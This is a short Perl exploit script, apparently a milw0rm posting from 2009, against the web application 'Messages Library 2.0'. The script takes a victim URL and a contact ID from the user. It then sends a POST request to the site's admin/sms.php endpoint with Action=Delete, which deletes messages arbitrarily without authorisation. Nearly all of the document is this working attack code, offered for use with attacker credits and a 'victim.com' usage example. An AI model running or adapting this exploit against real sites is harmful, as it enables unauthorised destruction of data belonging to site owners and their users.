#!/usr/bin/perl -w
#  Messages Library 2.0 <=  Arbitrary Delete Message
########################################
#[*] Founded &  Exploited by : Stack
########################################
print "\t\t############################################################\n\n";
print "\t\t#   Messages Library 2.0 <=  Arbitrary Delete Message      #\n\n";
print "\t\t#                          by Stack                        #\n\n";
print "\t\t############################################################\n\n";
use LWP::UserAgent;
die "Example: perl $0 http://victim.com/path/\n" unless @ARGV;
print "\n[!] ContactID : ";
chomp(my $id=<STDIN>);
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $ARGV[0] . "/admin/sms.php?Action=Delete&ID=".$id."";
$res = $b->request(HTTP::Request->new(POST=>$host));
        print "\nBrought to you by v4-team.com...\n";
        print "\n[+] Message Deleted \n";

# milw0rm.com [2009-07-01]